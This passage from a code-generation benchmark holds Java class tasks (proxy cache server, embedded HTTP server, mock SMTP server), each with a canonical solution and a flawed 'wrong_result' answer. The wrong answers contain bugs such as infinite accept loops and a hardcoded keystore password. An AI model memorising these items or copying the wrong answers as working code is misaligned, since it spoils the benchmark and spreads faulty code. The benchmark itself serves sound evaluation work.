}\n\n        public void run() {\n            BufferedReader in = null;\n            try {\n                in = new BufferedReader(new InputStreamReader(mClient.getInputStream()), 1024);\n                String request = in.readLine();\n                // Process client request here\n            } catch(IOException e) {\n                // Ignore\n            } finally {\n                if (in != null) {\n                    try {\n                        in.close();\n                    } catch (IOException e) {\n                        // Ignore\n                    }\n                }\n                if (mClient != null) {\n                    try {\n                        mClient.close();\n                    } catch (IOException e) {\n                        // Ignore\n                    }\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class ViewServer {\n    public static final int VIEW_SERVER_DEFAULT_PORT = 4939;\n    public static final int VIEW_SERVER_MAX_CONNECTIONS = 10;\n\n    private ServerSocket mServer;\n    private int mPort;\n    private Thread mThread;\n    private ExecutorService mThreadPool;\n\n    public ViewServer(int port) {\n        this.mPort = port;\n    }\n\n    public boolean start() {\n        if (mServer != null) {\n            return false;\n        }\n        try {\n            mPort = (mPort == 0) ? VIEW_SERVER_DEFAULT_PORT : mPort;\n            mServer = new ServerSocket(mPort);\n            mThreadPool = Executors.newFixedThreadPool(VIEW_SERVER_MAX_CONNECTIONS);\n            mThread = new Thread(this);\n            mThread.start();\n            return true;\n        } catch (IOException e) {\n            return false;\n        }\n    }\n\n    public boolean stop() {\n        if (mServer == null) {\n            return false;\n        }\n        try {\n            mServer.close();\n            mThreadPool.shutdown();\n            mThread.interrupt();\n            return true;\n        } catch (IOException e) {\n            return false;\n        }\n    }\n\n    public void run() {\n        while (true) {\n            try {\n                Socket clientSocket = mServer.accept();\n                mThreadPool.execute(new ViewServerWorker(clientSocket));\n            } catch (IOException e) {\n                break;\n            }\n        }\n    }\n\n    private class ViewServerWorker implements Runnable {\n        private Socket client;\n\n        public ViewServerWorker(Socket client) {\n            this.client = client;\n        }\n\n        public void run() {\n            try {\n                InputStream input = client.getInputStream();\n                BufferedReader reader = new BufferedReader(new InputStreamReader(input));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    System.out.println(\"Received: \" + line);\n                }\n                client.close();\n            } catch (IOException e) {\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 557,
    "Instruction": "Task Description: Create a Java class that implements a simple HTTP proxy cache server using ServerSocket for handling client connections and requests.\n\nClass Description: The HttpProxyCacheServer class acts as a local proxy server that listens for incoming client connections, processes HTTP GET requests, and can respond to ping requests. It manages client connections using a thread pool for concurrent request handling.\n\nAttributes:\n- serverSocket: [ServerSocket] - The main server socket that listens for incoming client connections\n- port: [int] - The port number on which the server is listening\n- waitConnectionThread: [Thread] - Thread that waits for incoming client connections\n- socketProcessor: [ExecutorService] - Thread pool for processing client sockets concurrently\n- pinger: [Pinger] - Helper class for handling ping requests\n\nMethods:\n- HttpProxyCacheServer([Context context]) -> [void] - Constructor that initializes the server socket and starts the connection waiting thread\n- waitForRequest() -> [void] - Continuously accepts incoming client connections and submits them to the thread pool\n- processSocket([Socket socket]) -> [void] - Processes an individual client socket connection and handles the request\n- releaseSocket([Socket socket]) -> [void] - Properly closes and releases socket resources\n- WaitRequestsRunnable([CountDownLatch startSignal]) -> [void] - Runnable implementation that starts the connection waiting process\n- SocketProcessorRunnable([Socket socket]) -> [void] - Runnable implementation that processes an individual client socket",
    "Canonical_solution": "import android.content.Context;\nimport java.io.File;\nimport java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.util.Locale;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class HttpProxyCacheServer {\n\n    private static final String PROXY_HOST = \"127.0.0.1\";\n\n    private final ServerSocket serverSocket;\n    private final int port;\n    private final Thread waitConnectionThread;\n    private final ExecutorService socketProcessor = Executors.newFixedThreadPool(8);\n    private final Pinger pinger;\n\n    public HttpProxyCacheServer(Context context) {\n        try {\n            InetAddress inetAddress = InetAddress.getByName(PROXY_HOST);\n            this.serverSocket = new ServerSocket(0, 8, inetAddress);\n            this.port = serverSocket.getLocalPort();\n            CountDownLatch startSignal = new CountDownLatch(1);\n            this.waitConnectionThread = new Thread(new WaitRequestsRunnable(startSignal));\n            this.waitConnectionThread.start();\n            startSignal.await();\n            this.pinger = new Pinger(PROXY_HOST, port);\n        } catch (IOException | InterruptedException e) {\n            socketProcessor.shutdown();\n            throw new IllegalStateException(\"Error starting local proxy server\", e);\n        }\n    }\n\n    private void waitForRequest() {\n        try {\n            while (!Thread.currentThread().isInterrupted()) {\n                Socket socket = serverSocket.accept();\n                socketProcessor.submit(new SocketProcessorRunnable(socket));\n            }\n        } catch (IOException e) {\n            // Handle error\n        }\n    }\n\n    private void processSocket(Socket socket) {\n        try {\n            GetRequest request = GetRequest.read(socket.getInputStream());\n            String url = ProxyCacheUtils.decode(request.uri);\n            if (pinger.isPingRequest(url)) {\n                pinger.responseToPing(socket);\n            } else {\n                // Process client request\n            }\n        } catch (SocketException e) {\n            // Client closed connection\n        } catch (IOException e) {\n            // Handle error\n        } finally {\n            releaseSocket(socket);\n        }\n    }\n\n    private void releaseSocket(Socket socket) {\n        try {\n            if (!socket.isInputShutdown()) {\n                socket.shutdownInput();\n            }\n            if (!socket.isOutputShutdown()) {\n                socket.shutdownOutput();\n            }\n            if (!socket.isClosed()) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            // Handle error\n        }\n    }\n\n    private final class WaitRequestsRunnable implements Runnable {\n        private final CountDownLatch startSignal;\n\n        public WaitRequestsRunnable(CountDownLatch startSignal) {\n            this.startSignal = startSignal;\n        }\n\n        @Override\n        public void run() {\n            startSignal.countDown();\n            waitForRequest();\n        }\n    }\n\n    private final class SocketProcessorRunnable implements Runnable {\n        private final Socket socket;\n\n        public SocketProcessorRunnable(Socket socket) {\n            this.socket = socket;\n        }\n\n        @Override\n        public void run() {\n            processSocket(socket);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class HttpProxyCacheServer {\n    private ServerSocket serverSocket;\n    private int port;\n    private Thread waitConnectionThread;\n    private ExecutorService socketProcessor;\n    private Pinger pinger;\n\n    public HttpProxyCacheServer(Context context) {\n        this.port = context.getPort();\n        try {\n            serverSocket = new ServerSocket(port);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        socketProcessor = Executors.newFixedThreadPool(10);\n        waitConnectionThread = new Thread(new WaitRequestsRunnable(new CountDownLatch(1)));\n        waitConnectionThread.start();\n    }\n\n    private void waitForRequest() {\n        while (true) {\n            try {\n                Socket socket = serverSocket.accept();\n                socketProcessor.submit(new SocketProcessorRunnable(socket));\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void processSocket(Socket socket) {\n        try {\n            BufferedReader input = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            String requestLine = input.readLine();\n            if (requestLine != null) {\n                String[] parts = requestLine.split(\" \");\n                if (parts.length >= 2 && parts[0].equals(\"GET\")) {\n                    // Handle GET request\n                } else if (parts[0].equals(\"PING\")) {\n                    pinger.handlePing();\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            releaseSocket(socket);\n        }\n    }\n\n    private void releaseSocket(Socket socket) {\n        try {\n            if (socket != null) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private class WaitRequestsRunnable implements Runnable {\n        private final CountDownLatch startSignal;\n\n        public WaitRequestsRunnable(CountDownLatch startSignal) {\n            this.startSignal = startSignal;\n        }\n\n        @Override\n        public void run() {\n            try {\n                startSignal.await();\n                waitForRequest();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private class SocketProcessorRunnable implements Runnable {\n        private final Socket socket;\n\n        public SocketProcessorRunnable(Socket socket) {\n            this.socket = socket;\n        }\n\n        @Override\n        public void run() {\n            processSocket(socket);\n        }\n    }\n}"
  },
  {
    "Task_id": 558,
    "Instruction": "Task Description: Implement a simple embedded HTTP server in Java that can handle incoming HTTP requests, parse request headers, and delegate request handling to a customizable method.\n\nClass Description: The EmbedHttpServer class represents a basic HTTP server that listens on a specified port, accepts client connections, parses HTTP requests, and provides hooks for custom request handling.\n\nAttributes:\n- port: int - The port number on which the server listens for incoming connections\n- serverSocket: ServerSocket - The server socket used to accept client connections\n\nMethods:\n- EmbedHttpServer(int port) -> None - Constructor that initializes the server with the specified port\n- start() -> void - Starts the server by creating a ServerSocket and launching a new thread to handle connections\n- stop() -> void - Stops the server by closing the ServerSocket and cleaning up resources\n- handle(String method, String path, HashMap<String, String> headers, InputStream input, OutputStream response) -> void - Abstract method to be implemented for custom request handling (takes HTTP method, path, headers, request body stream, and response stream)\n- run() -> void - Main server loop that accepts connections, parses requests, and delegates to handle() method (implements Runnable interface)\n- BodyInputStream(InputStream ins, int n) -> None - Nested class constructor that creates an input stream with limited bytes to read\n- available() -> int - Returns the number of bytes available in the BodyInputStream\n- read() -> int - Reads a single byte from the BodyInputStream\n- read(byte[] b, int off, int len) -> int - Reads bytes into an array from the BodyInputStream\n- skip(long n) -> long - Throws IOException as skipping is not supported\n- close() -> void - Closes the underlying input stream",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.HashMap;\n\npublic class EmbedHttpServer implements Runnable {\n    private int port;\n    private ServerSocket serverSocket;\n\n    public EmbedHttpServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws IOException {\n        if (serverSocket == null) {\n            serverSocket = new ServerSocket(port);\n            new Thread(this, \"embed-http-server\").start();\n        }\n    }\n\n    public void stop() throws IOException {\n        if (serverSocket != null) {\n            serverSocket.close();\n            serverSocket = null;\n        }\n    }\n\n    protected void handle(String method, String path,\n            HashMap<String, String> headers, InputStream input,\n            OutputStream response) throws Exception {\n    }\n\n    @Override\n    public void run() {\n        final ServerSocket ss = serverSocket;\n        while (ss == serverSocket) {\n            Socket conn = null;\n            try {\n                conn = ss.accept();\n                String method = null;\n                String path = null;\n                HashMap<String, String> headers = new HashMap<String, String>();\n\n                InputStream ins = conn.getInputStream();\n                StringBuilder sb = new StringBuilder(512);\n                int l;\n                while ((l = ins.read()) != -1) {\n                    if (l == '\\n') {\n                        if (sb.length() > 0\n                                && sb.charAt(sb.length() - 1) == '\\r')\n                            sb.setLength(sb.length() - 1);\n                        if (sb.length() == 0) {\n                            break;\n                        } else if (method == null) {\n                            int i = sb.indexOf(\" \");\n                            method = sb.substring(0, i);\n                            int j = sb.lastIndexOf(\" HTTP/\");\n                            path = sb.substring(i + 1, j).trim();\n                        } else {\n                            int i = sb.indexOf(\":\");\n                            String name = sb.substring(0, i).trim();\n                            String val = sb.substring(i + 1).trim();\n                            headers.put(name, val);\n                        }\n                        sb.setLength(0);\n                    } else {\n                        sb.append((char) l);\n                    }\n                }\n                int contentLength = 0;\n                String str = headers.get(\"Content-Length\");\n                if (str != null) {\n                    contentLength = Integer.parseInt(str);\n                }\n                OutputStream os = conn.getOutputStream();\n                str = headers.get(\"Expect\");\n                if (\"100-Continue\".equalsIgnoreCase(str)) {\n                    os.write(\"HTTP/1.1 100 Continue\\r\\n\\r\\n\".getBytes(\"ASCII\"));\n                    os.flush();\n                }\n                InputStream input = new BodyInputStream(ins, contentLength);\n                handle(method, path, headers, input, os);\n                os.close();\n\n                conn.close();\n                conn = null;\n            } catch (Exception e) {\n                if (conn != null) {\n                    try {\n                        conn.close();\n                    } catch (Exception ee) {\n                    }\n                }\n            }\n\n            if (!ss.isBound() || ss.isClosed()) {\n                serverSocket = null;\n            }\n        }\n    }\n\n    private static class BodyInputStream extends InputStream {\n        private InputStream ins;\n        private int n;\n\n        public BodyInputStream(InputStream ins, int n) {\n            this.ins = ins;\n            this.n = n;\n        }\n\n        @Override\n        public int available() throws IOException {\n            return n;\n        }\n\n        @Override\n        public int read() throws IOException {\n            if (n <= 0)\n                return -1;\n            int r = ins.read();\n            if (r != -1)\n                n--;\n            return r;\n        }\n\n        @Override\n        public int read(byte[] b, int off, int len) throws IOException {\n            if (n <= 0)\n                return -1;\n            int l = ins.read(b, off, len < n ? len : n);\n            if (l != -1)\n                n -= l;\n            return l;\n        }\n\n        @Override\n        public long skip(long n) throws IOException {\n            throw new IOException(\"unsupported\");\n        }\n\n        @Override\n        public void close() throws IOException {\n            ins.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public abstract class EmbedHttpServer implements Runnable {\n    private int port;\n    private ServerSocket serverSocket;\n\n    public EmbedHttpServer(int port) {\n        this.port = port;\n    }\n\n    public void start() {\n        try {\n            serverSocket = new ServerSocket(port);\n            Thread thread = new Thread(this);\n            thread.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        try {\n            if (serverSocket != null) {\n                serverSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public abstract void handle(String method, String path, HashMap<String, String> headers, InputStream input, OutputStream response);\n\n    @Override\n    public void run() {\n        while (true) {\n            try {\n                Socket clientSocket = serverSocket.accept();\n                InputStream input = clientSocket.getInputStream();\n                OutputStream response = clientSocket.getOutputStream();\n\n                String requestLine = readLine(input);\n                String[] parts = requestLine.split(\" \");\n                String method = parts[0];\n                String path = parts[1];\n                String httpVersion = parts[2];\n\n                HashMap<String, String> headers = new HashMap<>();\n                String line;\n                while ((line = readLine(input)).trim().length() > 0) {\n                    int colonIndex = line.indexOf(':');\n                    if (colonIndex != -1) {\n                        String key = line.substring(0, colonIndex).trim();\n                        String value = line.substring(colonIndex + 1).trim();\n                        headers.put(key, value);\n                    }\n                }\n\n                int contentLength = 0;\n                if (headers.containsKey(\"Content-Length\")) {\n                    contentLength = Integer.parseInt(headers.get(\"Content-Length\"));\n                }\n\n                BodyInputStream bodyInput = new BodyInputStream(input, contentLength);\n\n                handle(method, path, headers, bodyInput, response);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private String readLine(InputStream input) throws IOException {\n        StringBuilder line = new StringBuilder();\n        int c;\n        while ((c = input.read()) != -1) {\n            if (c == '\\r') {\n                continue;\n            } else if (c == '\\n') {\n                break;\n            } else {\n                line.append((char) c);\n            }\n        }\n        return line.toString();\n    }\n\n    static class BodyInputStream extends InputStream {\n        private InputStream ins;\n        private int limit;\n        private int pos = 0;\n\n        BodyInputStream(InputStream ins, int limit) {\n            this.ins = ins;\n            this.limit = limit;\n        }\n\n        @Override\n        public int available() throws IOException {\n            int availableFromUnderlying = ins.available();\n            return Math.min(availableFromUnderlying, limit - pos);\n        }\n\n        @Override\n        public int read() throws IOException {\n            if (pos >= limit) {\n                return -1;\n            }\n            int b = ins.read();\n            if (b != -1) {\n                pos++;\n            }\n            return b;\n        }\n\n        @Override\n        public int read(byte[] b, int off, int len) throws IOException {\n            if (pos >= limit) {\n                return -1;\n            }\n            int bytesRead = ins.read(b, off, Math.min(len, limit - pos));\n            if (bytesRead != -1) {\n                pos += bytesRead;\n            }\n            return bytesRead;\n        }\n\n        @Override\n        public long skip(long n) throws IOException {\n            throw new IOException(\"Skipping is not supported\");\n        }\n\n        @Override\n        public void close() throws IOException {\n            ins.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 559,
    "Instruction": "Task Description: Create a mock SMTP server implementation in Java that can simulate SMTP interactions, handle TLS upgrades, and manage client connections for testing purposes.\n\nClass Description: MockSmtpServer is a test utility class that simulates an SMTP server with support for plaintext and TLS connections. It maintains a queue of expected interactions and processes them sequentially when clients connect.\n\nAttributes:\n- interactions: Deque<SmtpInteraction> - A thread-safe queue of expected SMTP interactions (commands, responses, TLS upgrades)\n- waitForConnectionClosed: CountDownLatch - Synchronization aid to wait for client disconnection\n- waitForAllExpectedCommands: CountDownLatch - Synchronization aid to wait for all expected commands to be processed\n- keyStoreProvider: KeyStoreProvider - Provides SSL/TLS keystore information\n- logger: Logger - Logging interface for server activities\n- mockServerThread: MockServerThread - The server thread handling client connections\n- host: String - The server's host address\n- port: int - The server's listening port\n\nMethods:\n- start() -> void - Starts the server on a random available port and begins listening for connections\n- shutdown() -> void - Stops the server and closes all connections\n- MockServerThread(ServerSocket, Deque<SmtpInteraction>, CountDownLatch, CountDownLatch, Logger, KeyStoreProvider) -> void - Inner class constructor for the server thread\n- run() -> void - Main server thread execution handling client connections and SMTP protocol\n- readExpectedCommand(ExpectedCommand) -> void - Reads and verifies an expected command from the client\n- writeCannedResponse(CannedResponse) -> void - Writes a predefined response to the client\n- upgradeToTls(Socket) -> void - Upgrades the connection to TLS using the provided keystore\n- shouldStop() -> void - Signals the server thread to stop processing\n\nNested Classes/Interfaces:\n- SmtpInteraction: Interface - Marker interface for SMTP interaction types\n- ExpectedCommand: Class - Represents an expected SMTP command from the client\n- CannedResponse: Class - Represents a predefined server response\n- UpgradeToTls: Class - Marker for TLS upgrade interaction\n- Logger: Interface - Logging interface for server activities",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.security.KeyManagementException;\nimport java.security.KeyStore;\nimport java.security.KeyStoreException;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.UnrecoverableKeyException;\nimport java.security.cert.CertificateException;\nimport java.util.Deque;\nimport java.util.concurrent.ConcurrentLinkedDeque;\nimport java.util.concurrent.CountDownLatch;\nimport javax.net.ssl.KeyManagerFactory;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSocket;\nimport javax.net.ssl.SSLSocketFactory;\nimport okio.BufferedSink;\nimport okio.BufferedSource;\nimport okio.Okio;\n\npublic class MockSmtpServer {\n    private final Deque<SmtpInteraction> interactions = new ConcurrentLinkedDeque<>();\n    private final CountDownLatch waitForConnectionClosed = new CountDownLatch(1);\n    private final CountDownLatch waitForAllExpectedCommands = new CountDownLatch(1);\n    private final KeyStoreProvider keyStoreProvider;\n    private final Logger logger;\n\n    private MockServerThread mockServerThread;\n    private String host;\n    private int port;\n\n    public MockSmtpServer(KeyStoreProvider keyStoreProvider, Logger logger) {\n        this.keyStoreProvider = keyStoreProvider;\n        this.logger = logger;\n    }\n\n    public void start() throws IOException {\n        InetAddress localAddress = InetAddress.getByName(null);\n        ServerSocket serverSocket = new ServerSocket(0, 1, localAddress);\n        host = serverSocket.getInetAddress().getHostAddress();\n        port = serverSocket.getLocalPort();\n\n        mockServerThread = new MockServerThread(serverSocket, interactions, waitForConnectionClosed,\n                waitForAllExpectedCommands, logger, keyStoreProvider);\n        mockServerThread.start();\n    }\n\n    public void shutdown() {\n        mockServerThread.shouldStop();\n    }\n\n    private static class MockServerThread extends Thread {\n        private final ServerSocket serverSocket;\n        private final Deque<SmtpInteraction> interactions;\n        private final CountDownLatch waitForConnectionClosed;\n        private final CountDownLatch waitForAllExpectedCommands;\n        private final Logger logger;\n        private final KeyStoreProvider keyStoreProvider;\n\n        private volatile boolean shouldStop = false;\n        private volatile Socket clientSocket;\n        private BufferedSource input;\n        private BufferedSink output;\n\n        public MockServerThread(ServerSocket serverSocket, Deque<SmtpInteraction> interactions,\n                CountDownLatch waitForConnectionClosed, CountDownLatch waitForAllExpectedCommands, Logger logger,\n                KeyStoreProvider keyStoreProvider) {\n            this.serverSocket = serverSocket;\n            this.interactions = interactions;\n            this.waitForConnectionClosed = waitForConnectionClosed;\n            this.waitForAllExpectedCommands = waitForAllExpectedCommands;\n            this.logger = logger;\n            this.keyStoreProvider = keyStoreProvider;\n        }\n\n        @Override\n        public void run() {\n            try {\n                Socket socket = serverSocket.accept();\n                serverSocket.close();\n                clientSocket = socket;\n\n                input = Okio.buffer(Okio.source(socket));\n                output = Okio.buffer(Okio.sink(socket));\n\n                while (!shouldStop && !interactions.isEmpty()) {\n                    SmtpInteraction interaction = interactions.pop();\n                    if (interaction instanceof ExpectedCommand) {\n                        readExpectedCommand((ExpectedCommand) interaction);\n                    } else if (interaction instanceof CannedResponse) {\n                        writeCannedResponse((CannedResponse) interaction);\n                    } else if (interaction instanceof UpgradeToTls) {\n                        upgradeToTls(socket);\n                    }\n                }\n\n                waitForAllExpectedCommands.countDown();\n                waitForConnectionClosed.countDown();\n            } catch (IOException | KeyStoreException | NoSuchAlgorithmException | \n                    CertificateException | UnrecoverableKeyException | KeyManagementException e) {\n                if (!shouldStop) {\n                    logger.log(\"Exception: %s\", e);\n                }\n            } finally {\n                try {\n                    clientSocket.close();\n                } catch (IOException e) {\n                    logger.log(\"Error closing socket: %s\", e);\n                }\n            }\n        }\n\n        private void readExpectedCommand(ExpectedCommand expectedCommand) throws IOException {\n            String command = input.readUtf8Line();\n            logger.log(\"C: %s\", command);\n        }\n\n        private void writeCannedResponse(CannedResponse cannedResponse) throws IOException {\n            String response = cannedResponse.getResponse();\n            logger.log(\"S: %s\", response);\n            output.writeUtf8(response);\n            output.writeUtf8(\"\\r\\n\");\n            output.flush();\n        }\n\n        private void upgradeToTls(Socket socket) throws KeyStoreException, IOException, NoSuchAlgorithmException,\n                CertificateException, UnrecoverableKeyException, KeyManagementException {\n            KeyStore keyStore = keyStoreProvider.getKeyStore();\n            KeyManagerFactory keyManagerFactory = KeyManagerFactory.getInstance(\n                    KeyManagerFactory.getDefaultAlgorithm());\n            keyManagerFactory.init(keyStore, keyStoreProvider.getPassword());\n\n            SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n            sslContext.init(keyManagerFactory.getKeyManagers(), null, null);\n            SSLSocket sslSocket = (SSLSocket) sslContext.getSocketFactory().createSocket(\n                    socket, socket.getInetAddress().getHostAddress(), socket.getPort(), true);\n            sslSocket.setUseClientMode(false);\n            sslSocket.startHandshake();\n\n            input = Okio.buffer(Okio.source(sslSocket.getInputStream()));\n            output = Okio.buffer(Okio.sink(sslSocket.getOutputStream()));\n        }\n\n        public void shouldStop() {\n            shouldStop = true;\n            try {\n                clientSocket.close();\n            } catch (IOException e) {\n                logger.log(\"Error closing socket: %s\", e);\n            }\n        }\n    }\n\n    private interface SmtpInteraction {}\n    private static class ExpectedCommand implements SmtpInteraction {\n        private final String command;\n        public ExpectedCommand(String command) {\n            this.command = command;\n        }\n    }\n    private static class CannedResponse implements SmtpInteraction {\n        private final String response;\n        public CannedResponse(String response) {\n            this.response = response;\n        }\n    }\n    private static class UpgradeToTls implements SmtpInteraction {}\n    public interface Logger {\n        void log(String format, Object... args);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class MockSmtpServer {\n    private final Deque<SmtpInteraction> interactions;\n    private final CountDownLatch waitForConnectionClosed;\n    private final CountDownLatch waitForAllExpectedCommands;\n    private final KeyStoreProvider keyStoreProvider;\n    private final Logger logger;\n    private MockServerThread mockServerThread;\n    private String host;\n    private int port;\n\n    public MockSmtpServer(KeyStoreProvider keyStoreProvider, Logger logger) {\n        this.interactions = new ConcurrentLinkedDeque<>();\n        this.waitForConnectionClosed = new CountDownLatch(1);\n        this.waitForAllExpectedCommands = new CountDownLatch(1);\n        this.keyStoreProvider = keyStoreProvider;\n        this.logger = logger;\n    }\n\n    public void start() {\n        try {\n            ServerSocket serverSocket = new ServerSocket(0);\n            this.port = serverSocket.getLocalPort();\n            this.host = \"localhost\";\n            this.mockServerThread = new MockServerThread(serverSocket, interactions, waitForConnectionClosed, waitForAllExpectedCommands, logger, keyStoreProvider);\n            mockServerThread.start();\n        } catch (IOException e) {\n            logger.log(\"Failed to start mock SMTP server: \" + e.getMessage());\n            throw new RuntimeException(e);\n        }\n    }\n\n    public void shutdown() {\n        if (mockServerThread != null) {\n            mockServerThread.shouldStop();\n            try {\n                waitForConnectionClosed.await();\n                waitForAllExpectedCommands.await();\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n                logger.log(\"Interrupted during shutdown: \" + e.getMessage());\n            }\n        }\n    }\n\n    static class MockServerThread implements Runnable {\n        private final ServerSocket serverSocket;\n        private final Deque<SmtpInteraction> interactions;\n        private final CountDownLatch waitForConnectionClosed;\n        private final CountDownLatch waitForAllExpectedCommands;\n        private final Logger logger;\n        private final KeyStoreProvider keyStoreProvider;\n\n        MockServerThread(ServerSocket serverSocket, Deque<SmtpInteraction> interactions, CountDownLatch waitForConnectionClosed, CountDownLatch waitForAllExpectedCommands, Logger logger, KeyStoreProvider keyStoreProvider) {\n            this.serverSocket = serverSocket;\n            this.interactions = interactions;\n            this.waitForConnectionClosed = waitForConnectionClosed;\n            this.waitForAllExpectedCommands = waitForAllExpectedCommands;\n            this.logger = logger;\n            this.keyStoreProvider = keyStoreProvider;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (!shouldStop()) {\n                    Socket socket = serverSocket.accept();\n                    logger.log(\"Accepted connection from \" + socket.getInetAddress());\n                    new Thread(new ClientHandler(socket)).start();\n                }\n            } catch (IOException e) {\n                logger.log(\"Error accepting connection: \" + e.getMessage());\n            } finally {\n                try {\n                    serverSocket.close();\n                } catch (IOException e) {\n                    logger.log(\"Error closing server socket: \" + e.getMessage());\n                }\n            }\n        }\n\n        private boolean shouldStop() {\n            // Implementation for stopping logic\n            return false;\n        }\n\n        private class ClientHandler implements Runnable {\n            private final Socket socket;\n\n            ClientHandler(Socket socket) {\n                this.socket = socket;\n            }\n\n            @Override\n            public void run() {\n                try {\n                    BufferedReader input = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n                    PrintWriter output = new PrintWriter(socket.getOutputStream(), true);\n\n                    while (true) {\n                        String line = input.readLine();\n                        if (line == null) break;\n                        logger.log(\"Received: \" + line);\n\n                        if (line.trim().isEmpty()) continue;\n\n                        if (line.startsWith(\"QUIT\")) {\n                            logger.log(\"Client disconnected\");\n                            break;\n                        }\n\n                        SmtpInteraction interaction = interactions.poll();\n                        if (interaction instanceof ExpectedCommand) {\n                            ExpectedCommand expectedCommand = (ExpectedCommand) interaction;\n                            if (expectedCommand.matches(line)) {\n                                writeCannedResponse(expectedCommand.getResponse(), output);\n                            } else {\n                                logger.log(\"Unexpected command: \" + line);\n                                socket.close();\n                                break;\n                            }\n                        } else if (interaction instanceof UpgradeToTls) {\n                            upgradeToTls(socket, output);\n                            break;\n                        } else {\n                            logger.log(\"Unknown interaction type: \" + interaction.getClass().getSimpleName());\n                            socket.close();\n                            break;\n                        }\n                    }\n                } catch (IOException e) {\n                    logger.log(\"Client handler error: \" + e.getMessage());\n                } finally {\n                    try {\n                        socket.close();\n                    } catch (IOException e) {\n                        logger.log(\"Error closing client socket: \" + e.getMessage());\n                    }\n                    waitForConnectionClosed.countDown();\n                }\n            }\n\n            private void writeCannedResponse(CannedResponse response, PrintWriter output) {\n                output.println(response.getMessage());\n                output.flush();\n                logger.log(\"Sent: \" + response.getMessage());\n            }\n\n            private void upgradeToTls(Socket socket, PrintWriter output) {\n                try {\n                    SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n                    KeyManagerFactory kmf = KeyManagerFactory.getInstance(\"SunX509\");\n                    kmf.init(keyStoreProvider.getKeystore(), \"password\".toCharArray());\n                    sslContext.init(kmf.getKeyManagers(), null, null);\n                    SSLSocket sslSocket = (SSLSocket) sslContext.getSocketFactory().createSocket(socket, socket.getInetAddress().getHostAddress(), socket.getPort(), true);\n                    sslSocket.startHandshake();\n                    output.println(\"220 TLS upgrade successful\");\n                    output.flush();\n                    logger.log(\"TLS upgraded successfully\");\n                } catch (Exception e) {\n                    logger.log(\"TLS upgrade failed: \" + e.getMessage());\n                }\n            }\n        }\n    }\n\n    interface SmtpInteraction {}\n    static class ExpectedCommand implements SmtpInteraction {\n        private final String command;\n        private final CannedResponse response;\n\n        ExpectedCommand(String command, CannedResponse response) {\n            this.command = command;\n            this.response = response;\n        }\n\n        boolean matches(String line) {\n            return line.trim().startsWith(command);\n        }\n    }\n\n    static class CannedResponse {\n        private final String message;\n\n        CannedResponse(String message) {\n            this.message = message;\n        }\n\n        String getMessage() {\n            return message;\n        }\n    }\n\n    static class UpgradeToTls implements SmtpInteraction {}\n\n    interface Logger {\n        void log(String message);\n    }\n\n    interface KeyStoreProvider {\n        KeyStore getKeystore();\n    }\n}"
  },
  {
    "Task_id": 56,
    "Instruction": "Task Description: Implement a utility class for handling media uploads to the WeChat API, including processing file types and managing HTTP connections for file transfer.\n\nClass Description: WechatMediaUtil is a Spring component that provides functionality to upload media files to WeChat's servers through their API. It handles authentication, file type validation, and multipart form data submission.\n\nAttributes:\n- wechatAccessTokenUtil: [WechatAccessTokenUtil] - Autowired dependency for managing WeChat access tokens\n- MEDIA_URL: [String] - Constant URL template for WeChat media upload API (contains ACCESS_TOKEN and TYPE placeholders)\n\nMethods:\n- uploadMedia: [uploadMedia](String type, String mediaFileUrl) -> String - Uploads a media file to WeChat servers. Takes media type and file URL as input, returns WeChat media ID. Handles token refresh on expiration and error cases.\n- judgeType: [judgeType](String contentType) -> String - Determines file extension from content type. Throws exception for unsupported types. Used internally by uploadMedia.\n\nInput for uploadMedia:\n- type: [String] - Media type (e.g., \"image\")\n- mediaFileUrl: [String] - URL of the media file to upload\n\nOutput for uploadMedia:\n- [String] - WeChat media ID of the uploaded file\n\nInput for judgeType:\n- contentType: [String] - MIME type of the file\n\nOutput for judgeType:\n- [String] - Corresponding file extension (e.g., \".jpg\")",
